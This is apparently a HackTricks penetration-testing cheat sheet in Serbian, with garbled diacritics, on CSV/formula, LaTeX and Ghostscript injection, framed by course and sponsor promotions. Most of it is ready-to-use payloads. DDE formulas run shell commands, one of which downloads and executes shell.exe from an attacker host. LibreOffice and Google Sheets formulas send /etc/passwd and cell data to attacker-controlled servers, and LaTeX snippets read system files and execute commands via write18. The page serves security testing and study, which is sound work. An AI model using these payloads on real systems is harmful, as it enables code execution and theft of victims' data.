# Formula/CSV/Doc/LaTeX/GhostScript Injection

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Formula Injection

### Info

Ako se vaÅ¡ **unos** **reflektuje** unutar **CSV fajlova** (ili bilo kog drugog fajla koji Ä‡e verovatno biti otvoren u **Excel-u**), moÅ¾da Ä‡ete moÄ‡i da ubacite Excel **formule** koje Ä‡e biti **izvrÅ¡ene** kada korisnik **otvori fajl** ili kada korisnik **klikne na neki link** unutar Excel tabele.

{% hint style="danger" %}
Danas **Excel upozorava** (nekoliko puta) **korisnika kada se neÅ¡to uÄitava izvan Excel-a** kako bi ga spreÄio od zlonamernih radnji. Stoga, poseban napor na socijalnom inÅ¾enjeringu mora biti primenjen na krajnji payload.
{% endhint %}

### [Wordlist](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hiperlink

**SledeÄ‡i primer je veoma koristan za eksfiltraciju sadrÅ¾aja iz konaÄnog excel dokumenta i za obavljanje zahteva ka proizvoljnim lokacijama. MeÄ‘utim, zahteva da korisnik klikne na link (i prihvati upozorenja).**

SledeÄ‡i primer je preuzet sa [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Zamislite da je doÅ¡lo do bezbednosnog propusta u sistemu za upravljanje studentskim evidencijama koji je iskoriÅ¡Ä‡en putem napada CSV ubacivanjem. Primarni cilj napadaÄa je da kompromituje sistem koji koriste nastavnici za upravljanje detaljima studenata. Metoda ukljuÄuje ubacivanje zlonamernog sadrÅ¾aja u aplikaciju, taÄnije unoÅ¡enjem Å¡tetnih formula u polja predviÄ‘ena za detalje studenata. Napad se odvija na sledeÄ‡i naÄin:

1. **Ubacivanje Zlonamernog SadrÅ¾aja:**
* NapadaÄ Å¡alje formu sa detaljima studenata ali ukljuÄuje formulu koja se Äesto koristi u tabelama (npr. `=HYPERLINK("<zlonamerni_link>","Kliknite ovde")`).
* Ova formula je dizajnirana da kreira hiperlink, ali vodi ka zlonamernom serveru koji kontroliÅ¡e napadaÄ.
2. **Izvoz Kompromitovanih Podataka:**
* Nastavnici, nesvesni kompromitovanja, koriste funkcionalnost aplikacije za izvoz podataka u CSV fajl.
* Kada se CSV fajl otvori, i dalje sadrÅ¾i zlonamerni sadrÅ¾aj. Ovaj sadrÅ¾aj se pojavljuje kao klikabilan hiperlink u tabeli.
3. **Pokretanje Napada:**
* Nastavnik klikne na hiperlink, verujuÄ‡i da je to legitimni deo detalja studenata.
* Klikom, osetljivi podaci (potencijalno ukljuÄujuÄ‡i detalje iz tabele ili raÄunara nastavnika) se Å¡alju na server napadaÄa.
4. **Logovanje Podataka:**
* Server napadaÄa prima i beleÅ¾i osetljive podatke poslate sa raÄunara nastavnika.
* NapadaÄ moÅ¾e zatim koristiti ove podatke za razliÄite zlonamerne svrhe, dodatno kompromitujuÄ‡i privatnost i bezbednost studenata i institucije.

### RCE

**Proverite** [**originalni post**](https://notsosecure.com/data-exfiltration-formula-injection-part1) **za dodatne detalje.**

U specifiÄnim konfiguracijama ili starijim verzijama Excel-a, funkcionalnost nazvana DinamiÄka Razmena Podataka (DDE) moÅ¾e biti iskoriÅ¡Ä‡ena za izvrÅ¡avanje proizvoljnih komandi. Da biste iskoristili ovo, sledeÄ‡e postavke moraju biti omoguÄ‡ene:

* Idite na Datoteka â†’ Opcije â†’ Centar za Poverenje â†’ Postavke Centra za Poverenje â†’ Spoljni SadrÅ¾aj, i omoguÄ‡ite **Pokretanje Servera za DinamiÄku Razmenu Podataka**.

Kada se otvori tabela sa zlonamernim sadrÅ¾ajem (i ako korisnik prihvati upozorenja), sadrÅ¾aj se izvrÅ¡ava. Na primer, da bi se pokrenula aplikacija kalkulatora, sadrÅ¾aj bi bio:
```markdown
`=cmd|' /C calc'!xxx`
```
Dodatne komande takoÄ‘e mogu biti izvrÅ¡ene, kao Å¡to je preuzimanje i izvrÅ¡avanje fajla koriÅ¡Ä‡enjem PowerShell-a:
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### Lokalno ukljuÄivanje datoteka (LFI) u LibreOffice Calc

LibreOffice Calc moÅ¾e se koristiti za Äitanje lokalnih datoteka i eksfiltraciju podataka. Evo nekoliko metoda:

* ÄŒitanje prvog reda iz lokalne datoteke `/etc/passwd`: `='file:///etc/passwd'#$passwd.A1`
* Eksfiltracija proÄitanih podataka na server pod kontrolom napadaÄa: `=WEBSERVICE(CONCATENATE("http://<napadaÄeva IP adresa>:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Eksfiltracija viÅ¡e od jednog reda: `=WEBSERVICE(CONCATENATE("http://<napadaÄeva IP adresa>:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Eksfiltracija DNS-a (slanje proÄitanih podataka kao DNS upita na DNS server pod kontrolom napadaÄa): `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<napadaÄeva domena>"))`

### Google Sheets za eksfiltraciju podataka izvan opsega (OOB)

Google Sheets nudi funkcije koje se mogu iskoristiti za eksfiltraciju podataka izvan opsega:

* **CONCATENATE**: Spaja nizove zajedno - `=CONCATENATE(A2:E2)`
* **IMPORTXML**: Uvozi podatke iz strukturiranih tipova podataka - `=IMPORTXML(CONCAT("http://<napadaÄeva IP adresa:Port>/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")`
* **IMPORTFEED**: Uvozi RSS ili ATOM feed-ove - `=IMPORTFEED(CONCAT("http://<napadaÄeva IP adresa:Port>//123.txt?v=", CONCATENATE(A2:E2)))`
* **IMPORTHTML**: Uvozi podatke iz HTML tabela ili lista - `=IMPORTHTML (CONCAT("http://<napadaÄeva IP adresa:Port>/123.txt?v=", CONCATENATE(A2:E2)),"table",1)`
* **IMPORTRANGE**: Uvozi opseg Ä‡elija iz druge radne sveske - `=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[ID_radne_sveske]", "sheet1!A2:E2")`
* **IMAGE**: UmeÄ‡e sliku u Ä‡eliju - `=IMAGE("https://<napadaÄeva IP adresa:Port>/images/srpr/logo3w.png")`

## LaTeX Injekcija

ObiÄno serveri koje Ä‡ete pronaÄ‡i na internetu koji **pretvaraju LaTeX kod u PDF** koriste **`pdflatex`**.\
Ovaj program koristi 3 glavna atributa za (ne)dozvoljeno izvrÅ¡avanje komandi:

* **`--no-shell-escape`**: **OnemoguÄ‡ava** konstrukt `\write18{komanda}`, Äak i ako je omoguÄ‡en u texmf.cnf datoteci.
* **`--shell-restricted`**: Isto kao `--shell-escape`, ali **ograniÄeno** na 'siguran' skup **unapred definisanih** \*\*komandi (\*\*Na Ubuntu 16.04 listu moÅ¾ete pronaÄ‡i u `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`**: **OmoguÄ‡ava** konstrukt `\write18{komanda}`. Komanda moÅ¾e biti bilo koja shell komanda. Ovaj konstrukt je obiÄno zabranjen iz sigurnosnih razloga.

MeÄ‘utim, postoje i drugi naÄini za izvrÅ¡avanje komandi, pa je radi izbegavanja RCE vrlo vaÅ¾no koristiti `--shell-restricted`.

### ÄŒitanje datoteke <a href="#read-file" id="read-file"></a>

MoÅ¾da Ä‡ete morati prilagoditi ubacivanje sa omotaÄima kao Å¡to su \[ ili $.
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### ProÄitajte jednolinijski fajl
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### ÄŒitanje viÅ¡elinijske datoteke
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### NapiÅ¡i fajl <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### IzvrÅ¡enje komande <a href="#command-execution" id="command-execution"></a>

Ulaz komande Ä‡e biti preusmeren na stdin, koristite privremenu datoteku da biste je dobili.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Ako dobijete bilo kakvu LaTex greÅ¡ku, razmislite o koriÅ¡Ä‡enju base64 da biste dobili rezultat bez loÅ¡ih karaktera
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

Od [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

**Proverite** [**https://blog.redteam-pentesting.de/2023/ghostscript-overview/**](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)

## Reference

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
